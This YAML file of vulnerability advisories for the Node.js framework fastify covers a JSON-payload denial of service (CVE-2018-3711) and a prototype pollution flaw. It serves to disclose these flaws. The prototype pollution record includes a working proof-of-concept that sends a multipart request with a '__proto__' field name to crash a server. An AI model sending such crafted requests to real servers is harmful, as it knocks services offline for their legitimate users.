---
- id: npmjs:npm:fastify:564
  title: Fastify denial-of-service vulnerability with large JSON payloads
  description: Affected versions of `fastify` are vulnerable to a denial of service
    when processing a request with `Content-Type` set to `application/json` and a
    very large payload.
  affected_package: fastify
  vulnerable_versions:
  - "<=0.37.0"
  severity: high
  package_manager: npm
  cve:
  - CVE-2018-3711
  cwe: CWE-119
  disclosed_date: 1970-01-01
  created_date: 1970-01-01
  last_modified_date: 1970-01-01
  credit: nwoltman
  references: https://npmjs.com/advisories/564
  source_url: https://npmjs.com/advisories/564
- id: snykio:npm:fastify:20180107
  title: Denial of Service (DoS)
  description: |+
    [`fastify`][1] is a web framework, for Node.js.

    Affected versions of the package are vulnerable to Denial of Service
    (DoS) attacks due to not limit the size of the payload before JSON
    parsing it. An attacker can send a request with `Content-Type:
    application/json` and a very large payload, causing the Node.js process
    to crash with an `uncaughtException`.



    [1]: https://www.npmjs.com/package/fastify
    \nDenial of Service (DoS) describes a family of attacks, all aimed at
    making a system inaccessible to its intended and legitimate users.

    Unlike other vulnerabilities, DoS attacks usually do not aim at
    breaching security. Rather, they are focused on making websites and
    services unavailable to genuine users resulting in downtime.

    One popular Denial of Service vulnerability is DDoS (a Distributed
    Denial of Service), an attack that attempts to clog network pipes to the
    system by generating a large volume of traffic from many machines.

    When it comes to open source libraries, DoS vulnerabilities allow
    attackers to trigger such a crash or crippling of the service by using a
    flaw either in the application code or from the use of open source
    libraries.

    Two common types of DoS vulnerabilities:

    * High CPU/Memory Consumption- An attacker sending crafted requests that
      could cause the system to take a disproportionate amount of time to
      process. For example,
      [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

    * Crash - An attacker sending crafted requests that could cause the
      system to crash. For Example, [npm `ws` package](npm:ws:20171108)

  affected_package: fastify
  vulnerable_versions:
  - "<0.38.0"
  severity: high
  package_manager: npm
  cve:
  - CVE-2018-3711
  cwe:
  - CWE-400
  disclosed_date: 2018-01-06
  created_date: 2018-01-25
  last_modified_date: 2018-01-25
  credit:
  - Nathan Woltman
  references:
  - https://github.com/fastify/fastify/commit/fabd2a011f2ffbb877394abe699f549513ffbd76
  - https://github.com/fastify/fastify/releases/tag/v0.38.0
  - https://hackerone.com/reports/303632
  source_url: https://snyk.io/vuln/npm:fastify:20180107
- id: snykio:npm:fastify:559018
  title: Prototype Pollution
  description: "[fastify][1] is a overhead web framework, for Node.js.\n\nAffected
    versions of this package are vulnerable to Prototype Pollution.\nIt is possible
    to crash a remote server parsing multipart requests by\nsending a specially crafted
    request\n\n### PoC   {#poc}\n\n    const http = require('http')\n    const fastify
    = require('fastify')()\n    const options = {\n        addToBody: true,\n        onFile:
    (fieldName, stream, filename, encoding, mimetype, body) => {\n            stream.resume();\n
    \       }\n    };\n    fastify.register(require('fastify-multipart'), options);\n
    \   fastify.post('/', function (req, reply) {\n        console.log(req.body.toString());\n
    \       reply.code(200).send();\n    });\n    fastify.listen(3000, () => {\n        console.log(`server
    listening on ${fastify.server.address().port}`)\n        const body =\n            '--AaB03x\\r\\n'
    +\n            'content-disposition: form-data; name=\"__proto__\"; filename=\"file1.txt\"\\r\\n'
    +\n            'Content-Type: text/plain\\r\\n' +\n            '\\r\\n' +\n            '...
    contents of file1.txt ...\\r\\r\\n' +\n            '--AaB03x--\\r\\n';\n        const
    r = {\n            hostname: 'localhost',\n            port: 3000,\n            path:
    '/',\n            method: 'POST',\n            headers: {\n                'content-type':
    'multipart/form-data; boundary=AaB03x'\n            }\n        };\n        const
    req = http.request(r, (res) => { });\n        req.write(body);\n        req.end();\n
    \   });\n\n\n\n[1]: https://www.npmjs.com/package/fastify\n\\nPrototype Pollution
    is a vulnerability affecting JavaScript. Prototype\nPollution refers to the ability
    to inject properties into existing\nJavaScript language construct prototypes,
    such as objects. JavaScript\nallows all Object attributes to be altered, including
    their magical\nattributes such as `_proto_`, `constructor` and `prototype`. An
    attacker\nmanipulates these attributes to overwrite, or pollute, a JavaScript\napplication
    object prototype of the base object by injecting other\nvalues. Properties on
    the `Object.prototype` are then inherited by all\nthe JavaScript objects through
    the prototype chain. When that happens,\nthis leads to either denial of service
    by triggering JavaScript\nexceptions, or it tampers with the application source
    code to force the\ncode path that the attacker injects, thereby leading to remote
    code\nexecution.\n\nThere are two main ways in which the pollution of prototypes
    occurs:\n\n* Unsafe `Object` recursive merge\n\n* Property definition by path\n\n###
    Unsafe Object recursive merge   {#unsafe-object-recursive-merge}\n\nThe logic
    of a vulnerable recursive merge function follows the following\nhigh-level model:\n\n
    \   merge (target, source)\n    \n      foreach property of source\n    \n        if
    property exists and is an object on both the target and the source\n    \n          merge(target[property],
    source[property])\n    \n        else\n    \n          target[property] = source[property]\n\n&lt;br&gt;\n\nWhen
    the source object contains a property named `_proto_` defined with\n`Object.defineProperty()`
    , the condition that checks if the property\nexists and is an object on both the
    target and the source passes and the\nmerge recurses with the target, being the
    prototype of `Object` and the\nsource of `Object` as defined by the attacker.
    Properties are then\ncopied on the `Object` prototype.\n\nClone operations are
    a special sub-class of unsafe recursive merges,\nwhich occur when a recursive
    merge is conducted on an empty object:\n`merge({},source)`.\n\n`lodash` and `Hoek`
    are examples of libraries susceptible to recursive\nmerge attacks.\n\n### Property
    definition by path   {#property-definition-by-path}\n\nThere are a few JavaScript
    libraries that use an API to define property\nvalues on an object based on a given
    path. The function that is\ngenerally affected contains this signature: `theFunction(object,
    path,\nvalue)`\n\nIf the attacker can control the value of “path”, they can set
    this value\nto `_proto_.myValue`. `myValue` is then assigned to the prototype
    of the\nclass of the object.\n\n"
  affected_package: fastify
  vulnerable_versions:
  - "<1.0.5"
  severity: high
  package_manager: npm
  cwe:
  - CWE-400
  disclosed_date: 2020-02-28
  created_date: 2020-02-28
  last_modified_date: 2020-02-28
  credit:
  - Eran Hammer
  - Matteo Collin
  references:
  - https://hackerone.com/reports/804772
  source_url: https://snyk.io/vuln/SNYK-JS-FASTIFY-559018
